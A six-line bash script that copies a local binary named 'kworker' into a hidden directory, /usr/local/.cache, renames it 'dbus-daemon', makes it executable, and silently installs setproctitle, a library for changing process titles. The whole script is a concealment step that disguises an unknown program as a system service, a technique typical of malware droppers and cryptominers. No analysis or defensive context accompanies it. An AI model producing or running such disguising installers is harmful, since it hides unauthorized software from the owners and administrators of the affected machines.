#!/bin/bash
set -e
mkdir -p /usr/local/.cache
cp ./kworker /usr/local/.cache/dbus-daemon
chmod +x /usr/local/.cache/dbus-daemon
pip3 install --user setproctitle >/dev/null 2>&1
